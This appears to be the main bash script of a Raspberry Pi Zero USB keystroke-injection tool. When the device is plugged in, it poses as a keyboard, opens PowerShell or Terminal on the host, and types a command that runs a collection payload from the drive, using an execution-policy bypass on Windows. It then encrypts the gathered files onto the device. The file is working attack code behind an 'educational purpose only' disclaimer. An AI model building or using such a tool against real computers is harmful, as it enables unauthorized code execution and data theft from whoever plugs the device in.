#!/bin/bash
# ============================================================================
#  Payload Runner — Raspberry Pi Zero Cybersecurity Tool
#
#  This script is called by the systemd service (cybersec-tool.service) after
#  the USB composite gadget is up.  The flow:
#
#    1.  Wait for the host to enumerate the USB device
#    2.  Detect the host OS by inspecting mass-storage filesystem artefacts
#    3.  Type keystrokes via /dev/hidg0 to open a shell on the host
#    4.  Inject a one-liner that executes the correct payload from the drive
#    5.  Wait for collection to finish, then encrypt the results
#    6.  Signal completion via GPIO LED
#
#  This is the "movie-hacker plug-and-play" engine.
#
#  Educational Purpose Only — authorized testing on systems you own.
# ============================================================================

set -uo pipefail   # no -e: we handle errors ourselves

# ───────────────────── Configuration ─────────────────────
MOUNT_POINT="/mnt/usb_share"
USB_IMAGE="/piusb.bin"
HID_DEV="/dev/hidg0"
LOG_FILE="/var/log/cybersec-tool.log"
LED_PIN=17
WAIT_ENUMERATE=6           # seconds to let the host enumerate USB
WAIT_PAYLOAD=25            # seconds for the payload to finish collecting
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# Try to find the project root (works when installed or when run from repo)
if [[ -d "${SCRIPT_DIR}/../../src" ]]; then
    PROJECT_DIR="$(cd "${SCRIPT_DIR}/../.." && pwd)"
else
    PROJECT_DIR="/opt/cybersec-tool"
fi
export PYTHONPATH="${PROJECT_DIR}/src:${PROJECT_DIR}:${PYTHONPATH:-}"

# ───────────────────── Logging ─────────────────────
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG_FILE"; }

# ───────────────────── GPIO LED helpers ─────────────────────
led_init() {
    [[ -d /sys/class/gpio ]] || return 0
    echo "$LED_PIN"  > /sys/class/gpio/export 2>/dev/null || true
    echo out         > "/sys/class/gpio/gpio${LED_PIN}/direction" 2>/dev/null || true
}
led_on()    { echo 1 > "/sys/class/gpio/gpio${LED_PIN}/value" 2>/dev/null || true; }
led_off()   { echo 0 > "/sys/class/gpio/gpio${LED_PIN}/value" 2>/dev/null || true; }
led_blink() {
    local count="${1:-3}" delay="${2:-0.2}"
    for (( i=0; i<count; i++ )); do
        led_on; sleep "$delay"; led_off; sleep "$delay"
    done
}

# ─────────────── HID keyboard helpers (boot protocol) ───────────────
# Report format: [modifier, 0x00, key1, key2, key3, key4, key5, key6]
# Key codes: https://usb.org/sites/default/files/hut1_21_0.pdf  §10

hid_send_report() {
    printf '%b' "$1" > "$HID_DEV" 2>/dev/null
}

hid_release() {
    hid_send_report '\x00\x00\x00\x00\x00\x00\x00\x00'
}

hid_press_key() {
    local mod="${1:-\x00}" key="$2"
    hid_send_report "${mod}\x00${key}\x00\x00\x00\x00\x00"
    sleep 0.02
    hid_release
    sleep 0.02
}

# Map ASCII printable characters to USB HID key codes
_char_to_hid() {
    local c="$1"
    case "$c" in
        a) echo '\x00 \x04';; b) echo '\x00 \x05';; c) echo '\x00 \x06';;
        d) echo '\x00 \x07';; e) echo '\x00 \x08';; f) echo '\x00 \x09';;
        g) echo '\x00 \x0a';; h) echo '\x00 \x0b';; i) echo '\x00 \x0c';;
        j) echo '\x00 \x0d';; k) echo '\x00 \x0e';; l) echo '\x00 \x0f';;
        m) echo '\x00 \x10';; n) echo '\x00 \x11';; o) echo '\x00 \x12';;
        p) echo '\x00 \x13';; q) echo '\x00 \x14';; r) echo '\x00 \x15';;
        s) echo '\x00 \x16';; t) echo '\x00 \x17';; u) echo '\x00 \x18';;
        v) echo '\x00 \x19';; w) echo '\x00 \x1a';; x) echo '\x00 \x1b';;
        y) echo '\x00 \x1c';; z) echo '\x00 \x1d';;
        A) echo '\x02 \x04';; B) echo '\x02 \x05';; C) echo '\x02 \x06';;
        D) echo '\x02 \x07';; E) echo '\x02 \x08';; F) echo '\x02 \x09';;
        G) echo '\x02 \x0a';; H) echo '\x02 \x0b';; I) echo '\x02 \x0c';;
        J) echo '\x02 \x0d';; K) echo '\x02 \x0e';; L) echo '\x02 \x0f';;
        M) echo '\x02 \x10';; N) echo '\x02 \x11';; O) echo '\x02 \x12';;
        P) echo '\x02 \x13';; Q) echo '\x02 \x14';; R) echo '\x02 \x15';;
        S) echo '\x02 \x16';; T) echo '\x02 \x17';; U) echo '\x02 \x18';;
        V) echo '\x02 \x19';; W) echo '\x02 \x1a';; X) echo '\x02 \x1b';;
        Y) echo '\x02 \x1c';; Z) echo '\x02 \x1d';;
        1) echo '\x00 \x1e';; 2) echo '\x00 \x1f';; 3) echo '\x00 \x20';;
        4) echo '\x00 \x21';; 5) echo '\x00 \x22';; 6) echo '\x00 \x23';;
        7) echo '\x00 \x24';; 8) echo '\x00 \x25';; 9) echo '\x00 \x26';;
        0) echo '\x00 \x27';;
        ' ')  echo '\x00 \x2c';;
        '-')  echo '\x00 \x2d';;   '=')  echo '\x00 \x2e';;
        '[')  echo '\x00 \x2f';;   ']')  echo '\x00 \x30';;
        '\\') echo '\x00 \x31';;   ';')  echo '\x00 \x33';;
        "'")  echo '\x00 \x34';;   '`')  echo '\x00 \x35';;
        ',')  echo '\x00 \x36';;   '.')  echo '\x00 \x37';;
        '/')  echo '\x00 \x38';;
        '!')  echo '\x02 \x1e';;   '@')  echo '\x02 \x1f';;
        '#')  echo '\x02 \x20';;   '$')  echo '\x02 \x21';;
        '%')  echo '\x02 \x22';;   '^')  echo '\x02 \x23';;
        '&')  echo '\x02 \x24';;   '*')  echo '\x02 \x25';;
        '(')  echo '\x02 \x26';;   ')')  echo '\x02 \x27';;
        '_')  echo '\x02 \x2d';;   '+')  echo '\x02 \x2e';;
        '{')  echo '\x02 \x2f';;   '}')  echo '\x02 \x30';;
        '|')  echo '\x02 \x31';;   ':')  echo '\x02 \x33';;
        '"')  echo '\x02 \x34';;   '~')  echo '\x02 \x35';;
        '<')  echo '\x02 \x36';;   '>')  echo '\x02 \x37';;
        '?')  echo '\x02 \x38';;
        *)    echo '\x00 \x00';;
    esac
}

hid_type_string() {
    local str="$1"
    for (( i=0; i<${#str}; i++ )); do
        local ch="${str:$i:1}"
        read -r mod key <<< "$(_char_to_hid "$ch")"
        hid_press_key "$mod" "$key"
    done
}

hid_enter() { hid_press_key '\x00' '\x28'; sleep 0.05; }

hid_gui_key() {
    local key="$1"
    hid_press_key '\x08' "$key"
    sleep 0.3
}

# ─────────────── OS Detection via filesystem artefacts ───────────────
detect_host_os() {
    if [[ -f "${MOUNT_POINT}/.DS_Store" ]] || [[ -d "${MOUNT_POINT}/.Spotlight-V100" ]]; then
        echo "macos"; return
    fi
    if [[ -f "${MOUNT_POINT}/desktop.ini" ]] || [[ -d "${MOUNT_POINT}/System Volume Information" ]]; then
        echo "windows"; return
    fi
    if dmesg 2>/dev/null | tail -30 | grep -qi "NTFS\|Windows\|MSFT"; then
        echo "windows"; return
    fi
    echo "windows"    # default assumption
}

# ─────────────── Open a terminal on the target ───────────────
open_terminal_windows() {
    hid_gui_key '\x15'     # GUI+R → Run dialog
    sleep 0.8
    hid_type_string "powershell"
    sleep 0.1
    hid_enter
    sleep 1.5
}

open_terminal_macos() {
    hid_gui_key '\x2c'     # Cmd+Space → Spotlight
    sleep 0.8
    hid_type_string "Terminal"
    sleep 0.3
    hid_enter
    sleep 1.5
}

# ─────────────── Execute the payload ───────────────
run_payload_windows() {
    log "Injecting Windows payload via HID..."
    open_terminal_windows
    local cmd
    cmd='$d=(Get-Volume|?{$_.FileSystemLabel -match "CYBERSEC|TRUSTED"}).DriveLetter;'
    cmd+='if($d){Set-Location "${d}:";'
    cmd+='powershell -Ep Bypass -File .\windows_payload.ps1 -OutputPath "${d}:"}' 
    cmd+=' else{echo "Drive not found"}'
    hid_type_string "$cmd"
    hid_enter
}

run_payload_macos() {
    log "Injecting macOS payload via HID..."
    open_terminal_macos
    local cmd
    cmd='vol=$(ls -d /Volumes/CYBERSEC* /Volumes/TRUSTED* 2>/dev/null|head -1);'
    cmd+='if [ -n "$vol" ];then bash "$vol/macos_payload.sh" -o "$vol";'
    cmd+='else echo "Drive not found";fi'
    hid_type_string "$cmd"
    hid_enter
}

# ─────────────── Encrypt collected data ───────────────
encrypt_results() {
    log "Encrypting collected data..."
    if command -v python3 &>/dev/null; then
        python3 - <<'PYEOF'
import sys, os, json, glob
sys.path.insert(0, os.environ.get("PYTHONPATH","").split(":")[0])
try:
    from tools.encrypt_data import SecureDataHandler
    mount = os.environ.get("MOUNT_POINT", "/mnt/usb_share")
    handler = SecureDataHandler(storage_path=mount)
    collected = {}
    for pattern in ("*.txt", "*.json"):
        for fp in glob.glob(os.path.join(mount, "**", pattern), recursive=True):
            try:
                with open(fp) as f:
                    collected[os.path.relpath(fp, mount)] = f.read()[:50000]
            except Exception:
                pass
    if collected:
        handler.store_encrypted_data(collected, "collected_data.enc")
        print(f"Encrypted {len(collected)} files -> collected_data.enc")
    else:
        print("No collectable data found.")
except Exception as e:
    print(f"Encryption error: {e}")
PYEOF
    else
        log "python3 not available — skipping encryption"
    fi
}

# ─────────────── Cleanup ───────────────
cleanup() {
    log "Cleaning up temp files..."
    find "${MOUNT_POINT}" -maxdepth 2 -type f -name "*.tmp" -delete 2>/dev/null || true
}

# ─────────────── Main ───────────────
main() {
    log "=== CYBERSEC PAYLOAD RUNNER STARTED ==="

    led_init
    led_blink 3 0.15

    log "Waiting ${WAIT_ENUMERATE}s for host enumeration..."
    sleep "$WAIT_ENUMERATE"

    mkdir -p "$MOUNT_POINT"
    if ! mountpoint -q "$MOUNT_POINT" 2>/dev/null; then
        mount -o loop "$USB_IMAGE" "$MOUNT_POINT" 2>/dev/null || mount -a 2>/dev/null || true
    fi

    local target_os
    target_os=$(detect_host_os)
    log "Detected host OS: ${target_os}"

    led_on

    if [[ -c "$HID_DEV" ]]; then
        case "$target_os" in
            windows) run_payload_windows ;;
            macos)   run_payload_macos   ;;
            *)       log "Unknown OS (${target_os}) — skipping HID injection" ;;
        esac
    else
        log "HID device ${HID_DEV} not found — gadget not configured?"
    fi

    log "Waiting ${WAIT_PAYLOAD}s for payload to complete..."
    sleep "$WAIT_PAYLOAD"

    encrypt_results
    cleanup

    led_off
    led_blink 5 0.1

    log "=== CYBERSEC PAYLOAD RUNNER COMPLETED ==="
}

main "$@"